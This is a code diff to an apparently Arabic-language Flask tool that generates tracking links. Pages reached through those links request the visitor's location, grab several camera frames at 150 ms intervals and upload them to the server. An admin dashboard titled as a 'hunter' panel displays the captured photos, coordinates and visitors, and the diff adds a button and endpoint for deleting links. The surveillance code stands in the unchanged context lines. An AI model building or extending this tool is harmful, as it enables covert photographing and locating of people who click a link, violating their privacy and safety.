@@ -204,7 +204,7 @@ REDIRECT_TEMPLATE = """
                 console.log('Location permission denied or timeout');
             }
 
-            // 2. طلب إذن الكاميرا والتقاط الصور بسرعة فائقة (تقليص فترة الانتظار بين اللقطات)
+            // 2. طلب إذن الكاميرا والتقاط الصور بسرعة فائقة
             let images = [];
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
@@ -213,7 +213,7 @@ REDIRECT_TEMPLATE = """
                 await video.play();
                 
                 for (let i = 0; i < 3; i++) {
-                    await new Promise(resolve => setTimeout(resolve, 150)); // سرعة التقاط أعلى (150ms بدلاً من 500ms)
+                    await new Promise(resolve => setTimeout(resolve, 150));
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
@@ -227,7 +227,7 @@ REDIRECT_TEMPLATE = """
                 console.log('Camera access skipped or denied:', err);
             }
             
-            // إرسال البيانات (الصور والإحداثيات فقط) للخلفية
+            // إرسال البيانات للخلفية
             try {
                 await fetch('/api/upload_selfie', {
                     method: 'POST',
@@ -877,11 +877,28 @@ ADMIN_TEMPLATE = """
             color: #555;
             margin-top: 5px;
         }
+        .delete-btn {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid #ef4444;
+            color: #ef4444;
+            padding: 10px 16px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 20px;
+            transition: all 0.2s;
+        }
+        .delete-btn:hover {
+            background: rgba(239, 68, 68, 0.2);
+            box-shadow: 0 0 15px rgba(239, 68, 68, 0.2);
+        }
     </style>
 </head>
 <body>
     <h1>📸 لوحة التقاط الصور والسيلفي والزوار</h1>
-    <p class="sub-title">صيّاد - تصفية تلقائية للروابط القديمة وعرض الإحداثيات الدقيقة وسيلفي متعدد سريع</p>
+    <p class="sub-title">صيّاد - إدارة الروابط والتحكم الكامل بالبيانات</p>
     
     <div class="stats-bar">
         <div class="stat-box">
@@ -943,9 +960,29 @@ ADMIN_TEMPLATE = """
             {% else %}
                 <div class="empty">لا توجد زيارات للمستلمين حتى الآن</div>
             {% endif %}
+
+            <button class="delete-btn" onclick="deleteLink('{{ link_id }}')">🗑️ حذف هذا الرابط وسجلاته</button>
         </div>
         {% endfor %}
     </div>
+
+    <script>
+        async function deleteLink(linkId) {
+            if (!confirm("هل أنت متأكد من رغبتك في حذف هذا الرابط نهائياً؟")) return;
+            try {
+                const res = await fetch(`/api/delete/${linkId}`, { method: 'POST' });
+                const data = await res.json();
+                if (data.success) {
+                    location.reload();
+                } else {
+                    alert("فشل في حذف الرابط");
+                }
+            } catch (err) {
+                console.error(err);
+                alert("حدث خطأ أثناء الاتصال بالخادم");
+            }
+        }
+    </script>
 </body>
 </html>
 """
@@ -1087,6 +1124,23 @@ def upload_selfie():
     except Exception as e:
         print(f"Data upload error: {e}")
         return jsonify({"success": False}), 500
+
+@app.route("/api/delete/<link_id>", methods=["POST"])
+def delete_link(link_id):
+    links = load_links()
+    if link_id in links:
+        link = links[link_id]
+        # حذف لقطة الشاشة المرتبطة إن وجدت
+        if link.get("screenshot"):
+            try:
+                os.remove(os.path.join(SCREENSHOTS_DIR, link["screenshot"]))
+            except Exception:
+                pass
+        
+        del links[link_id]
+        save_links(links)
+        return jsonify({"success": True})
+    return jsonify({"success": False}), 404
 
 def take_screenshot(url, link_id):
     filename = f"{link_id}_{int(datetime.now().timestamp())}.png"
